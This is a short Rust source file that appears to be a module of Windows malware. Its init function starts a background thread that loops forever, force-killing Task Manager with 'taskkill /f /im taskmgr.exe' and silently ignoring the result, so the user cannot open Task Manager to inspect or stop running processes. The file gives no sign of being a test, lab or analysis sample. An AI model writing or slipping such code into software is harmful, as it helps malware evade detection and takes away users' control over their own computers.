use std::process::Command;
use std::thread;

pub fn init() {
    thread::spawn(|| loop {
        drop(
            Command::new("taskkill")
                .args(["/f", "/im", "taskmgr.exe"])
                .output(),
        );
    });
}
